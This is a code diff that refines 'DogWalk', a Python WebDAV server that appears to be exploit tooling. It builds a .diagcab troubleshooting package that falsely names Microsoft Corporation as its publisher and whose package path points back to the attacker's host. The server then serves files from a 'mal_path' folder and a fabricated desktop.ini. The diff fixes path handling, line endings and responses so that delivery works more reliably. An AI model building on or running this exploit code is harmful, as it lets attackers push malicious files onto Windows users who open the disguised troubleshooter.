@@ -48,10 +48,10 @@ class DogWalk:
         xml_contents = f"""<?xml version="1.0" encoding="utf-8"?>
 <PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008">
   <Execution>
-    <Package Path="\\{self.lhost}@{self.lport}\DavWWWRoot\package" />
+    <Package Path="\\\\{self.lhost}@{self.lport}\\DavWWWRoot\\package" />
     <Name>Some name</Name>
     <Description>Some description</Description>
-    <Icon>@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001</Icon>
+    <Icon>@%windir%\\diagnostics\\system\\WindowsUpdate\\DiagPackage.dll,-1001</Icon>
   </Execution>
 
   <Index>
@@ -60,20 +60,19 @@ class DogWalk:
     <PrivacyUrl>http://go.microsoft.com/fwlink/?LinkId=190175</PrivacyUrl>
     <Version>1.0</Version>
     <PublisherName>Microsoft Corporation</PublisherName>
-    <Category>@%windir%\system32\DiagCpl.dll,-412</Category>
-    <Keyword>@%windir%\system32\DiagCpl.dll,-27</Keyword>
+    <Category>@%windir%\\system32\\DiagCpl.dll,-412</Category>
+    <Keyword>@%windir%\\system32\\DiagCpl.dll,-27</Keyword>
   </Index>
-</PackageConfiguration>"""
+</PackageConfiguration>\n""".replace("\n","\r\n")
         arc = CabArchive()
         arc["Custom.diagcfg"] = CabFile(xml_contents.encode())
-        self.diagcab = arc.save()
+        self.diagcab = arc.save(True)
         self.fs["config"][self.cabname] = (FAKE_FILE, len(self.diagcab), None)
 
     def build_file_structure(self):
         for file in self.files:
             filesize = os.stat(str(file)).st_size
             self.fs["package"][f"{self.mal_path}{file.name}"] = (REAL_FILE,filesize,file)
-        print(self.fs)
 
     def gettimestr(self):
         return strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
@@ -88,11 +87,20 @@ class DogWalk:
         return (resp + data).encode()
 
     def reply_404(self):
-        resp  = "HTTP/1.1 404 Not-Found\r\n"
+        resp  = "HTTP/1.1 404 Not-found\r\n"
         resp += "Date: " + self.gettimestr() + "\r\n"
         resp += "Server: dogwalk\r\n\r\n"
 
         return resp.encode()
+
+    def reply_200(self, data):
+        resp  = "HTTP/1.1 200 OK\r\n"
+        resp += "Date: " + self.gettimestr() + "\r\n"
+        resp += "Server: dogwalk\r\n"
+        resp += f"Content-Length: {len(data)}\r\n"
+        resp += "Content-Type: application/octet-stream\r\n\r\n"
+
+        return resp.encode() + data
 
     def handle_options(self):
         resp  = "HTTP/1.1 200 OK\r\n"
@@ -109,28 +117,30 @@ class DogWalk:
         return resp.encode()
 
     def handle_get(self, dirname, filename):
+        if "package" in dirname and filename == "desktop.ini":
+            return self.reply_200(b"1\n")
+
         if self.fs.get(dirname):
             d = self.fs[dirname]
             if d.get(filename):
                 (is_real, size, f) = d[filename]
                 if is_real == REAL_FILE:
                     with open(str(f), "rb") as fh:
-                        data = f.read()
-                        size = len(data)
+                        data = fh.read()
                 else:
                     data = self.diagcab
-                
-                resp  = "HTTP/1.1 200 OK\r\n"
-                resp += "Date: " + self.gettimestr() + "\r\n"
-                resp += "Server: dogwalk\r\n"
-                resp += f"Content-Length: {size}\r\n"
-                resp += "Content-Type: application/octet-stream\r\n\r\n"
-
-                return resp.encode() + data
+                return self.reply_200(data)
 
             else:
                 return self.reply_404()
         else:
+            for fp in self.fs["package"]:
+                p = PureWindowsPath(fp)
+                if p.name == filename:
+                    (is_real, size, f) = self.fs["package"][fp]
+                    with open(str(f), "rb") as fh:
+                        data = fh.read()
+                    return self.reply_200(data)
             return self.reply_404()        
 
     
@@ -144,7 +154,7 @@ class DogWalk:
         <lp1:creationdate>{self.gettimestr()}</lp1:creationdate>
       </D:prop>
    </D:propstat>
-</D:response>"""
+</D:response>\n"""
 
     def file_entry(self, dirname, filename, flen):
         return f"""<D:response xmlns:lp1="DAV:">
@@ -156,14 +166,19 @@ class DogWalk:
         <lp1:creationdate>{self.gettimestr()}</lp1:creationdate>
       </D:prop>
    </D:propstat>
-</D:response>"""
+</D:response>\n"""
 
 
     def handle_dir_propfind(self, dirname, depth):
+        d = dirname
+        if not d.startswith("/"):
+            d = "/" + d
+        if not d.endswith("/"):
+            d += "/"
         header = f"""<?xml version="1.0" encoding="utf-8"?>
 <D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">
 <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/" xmlns:g0="DAV:">
-<D:href>{dirname}</D:href>
+<D:href>{d}</D:href>
 <D:propstat>
 <D:prop>
 <lp1:resourcetype><D:collection/></lp1:resourcetype>
@@ -172,7 +187,7 @@ class DogWalk:
 </D:prop>
 <D:status>HTTP/1.1 200 OK</D:status>
 </D:propstat>
-</D:response>"""
+</D:response>\n"""
         footer = "</D:multistatus>"
 
         resp = ""
@@ -187,24 +202,34 @@ class DogWalk:
             for file in self.fs[d]:
                 fi = self.fs[d][file]
                 resp = resp + self.file_entry(d, file, fi[1])
+            if d == 'package':
+                resp += self.file_entry("package","desktop.ini",1)
             resp = resp + footer
 
         return self.reply_207(resp)
 
 
-    def handle_file_propfind(self, directory, file):
+    def handle_file_propfind(self, directory, filename):
         header = """<?xml version="1.0" encoding="utf-8"?>
-<D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">"""
-        footer = "</D:multistatus>"
+<D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">\n"""
+        footer = "</D:multistatus>\n"
+
+        if "package" in directory and filename == "desktop.ini":
+            resp = header + self.file_entry("/package","desktop.ini",1) + footer
+            return self.reply_207(resp)
 
         if self.fs.get(directory):
-            if self.fs[directory].get(file):
-                resp = header + self.file_entry(directory, file, self.fs[directory][file][1]) + footer
+            if self.fs[directory].get(filename):
+                resp = header + self.file_entry(directory, filename, self.fs[directory][filename][1]) + footer
                 return self.reply_207(resp)
-            else:
-                return self.reply_404()
-        else:
-            return self.reply_404()
+        
+        for f in self.fs["package"]:
+            p = PureWindowsPath(f)
+            if p.name == filename:
+                resp = header + self.file_entry(directory, filename, self.fs["package"][f][1]) + footer 
+                return self.reply_207(resp)
+
+        return self.reply_404()
 
 
     def handle_web(self):
@@ -213,8 +238,10 @@ class DogWalk:
         s.bind(("0.0.0.0", self.lport))
         s.listen(5)
         sys.stderr.write(f"Serving on 0.0.0.0:{self.lport}\n")
+        prev_cs = []
         while True:
             (cs,addr) = s.accept()
+            prev_cs.append(cs)
             sys.stderr.write(f"Got connection from {addr[0]}:{addr[1]}\n")
 
             data = cs.recv(1024)
@@ -224,7 +251,7 @@ class DogWalk:
                 sys.stderr.write(f"Handling OPTIONS\n")
                 resp = self.handle_options()
             elif data.startswith(b"GET "):
-                path = re.match(b"GET /([^/]+)/([^/]+) HTTP", data)
+                path = re.match(b"GET /(.+)/([^/]+)? HTTP", data)
                 if path:
                     directory = path.group(1).decode()
                     filename = path.group(2).decode()
@@ -232,7 +259,7 @@ class DogWalk:
                     resp = self.handle_get(directory, filename)
             elif data.startswith(b"PROPFIND "):
                 sys.stderr.write("Handling PROPFIND\n")
-                path = re.match(b"PROPFIND /([^/]+)/([^/]+) HTTP.*", data)
+                path = re.match(b"PROPFIND /(.+)/([^/]+) HTTP.*", data)
                 if path:
                    directory = path.group(1).decode()
                    filename = path.group(2).decode()
@@ -251,7 +278,9 @@ class DogWalk:
             if len(resp) > 0:
                 cs.send(resp)
 
-            cs.close()
+            cs.shutdown(socket.SHUT_WR)
+
+        s.close()
 
 
 def main():
